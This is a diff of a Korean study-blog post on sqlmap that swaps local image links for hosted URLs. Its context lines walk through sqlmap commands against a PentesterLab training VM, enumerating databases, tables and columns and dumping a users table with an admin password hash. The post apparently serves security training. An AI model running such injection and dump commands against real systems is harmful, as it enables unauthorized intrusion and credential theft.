@@ -144,9 +144,9 @@ sqlmap 실습을 위해서 [PentesterLab의 From SQL Injection to Shell 훈련�
 
 실제 서버를 공격하여 생기는 책임은 본인에게 있음을 경고합니다..{:.warning} 
 
- ![Image](2019-10-25-study-db-sqlmap.assets/image-20191025114201321.png){:.border.rounded} 
+ ![Image](http://eliez3r.synology.me/assets/img/study/db/sqlmap/image-20191025114201321.png){:.border.rounded} 
 
-![image](2019-10-25-study-db-sqlmap.assets/image-20191025114516313.png){:.border.rounded}
+![image](http://eliez3r.synology.me/assets/img/study/db/sqlmap/image-20191025114516313.png){:.border.rounded}
 
 
 
@@ -158,7 +158,7 @@ sqlmap 실습을 위해서 [PentesterLab의 From SQL Injection to Shell 훈련�
 sqlmap -u "http://192.168.23.131/cat.php?id=1"
 ```
 
- ![img](2019-10-25-study-db-sqlmap.assets/SNAGHTML38e12cd3.PNG) {:.border.rounded}  
+ ![img](http://eliez3r.synology.me/assets/img/study/db/sqlmap/SNAGHTML38e12cd3.PNG) {:.border.rounded}  
 
 OS정보와 Web Application정보, DBMS정보등을 알아오는 것을 알 수 있다.
 
@@ -180,7 +180,7 @@ sqlmap -u "http://192.168.23.131/cat.php?id=1" --dbms=mysql
 sqlmap -u "http://192.168.23.131/cat.php?id=1" --dbs
 ```
 
-![image](2019-10-25-study-db-sqlmap.assets/image-20191025122018616.png) {:.border.rounded} 
+![image](http://eliez3r.synology.me/assets/img/study/db/sqlmap/image-20191025122018616.png) {:.border.rounded} 
 
 
 
@@ -192,7 +192,7 @@ sqlmap -u "http://192.168.23.131/cat.php?id=1" --dbs
 sqlmap -u "http://192.168.23.131/cat.php?id=1" -D photoblog --tables
 ```
 
-![image](2019-10-25-study-db-sqlmap.assets/image-20191025122242193.png){:.border.rounded} 
+![image](http://eliez3r.synology.me/assets/img/study/db/sqlmap/image-20191025122242193.png){:.border.rounded} 
 
 해당 데이터베이스의 테이블들을 조회한 모습을 볼수 있다.
 
@@ -206,7 +206,7 @@ sqlmap -u "http://192.168.23.131/cat.php?id=1" -D photoblog --tables
 sqlmap -u "http://192.168.23.131/cat.php?id=1" -D photoblog -T users --columns
 ```
 
-![image](2019-10-25-study-db-sqlmap.assets/image-20191025122542041.png) {:.border.rounded} 
+![image](http://eliez3r.synology.me/assets/img/study/db/sqlmap/image-20191025122542041.png) {:.border.rounded} 
 
 
 
@@ -218,7 +218,7 @@ users테이블의 모든 내용들을 덤프해보자.
 sqlmap -u "http://192.168.23.131/cat.php?id=1" -D photoblog -T users --dump
 ```
 
-![image](2019-10-25-study-db-sqlmap.assets/image-20191025122738312.png) {:.border.rounded} 
+![image](http://eliez3r.synology.me/assets/img/study/db/sqlmap/image-20191025122738312.png) {:.border.rounded} 
 
 user는 `admin` 계정이 존재하고 패스워드는 hash값으로 되어있지만, 해당 해쉬값이 P4ssw0rd 임을 알려준다.
 
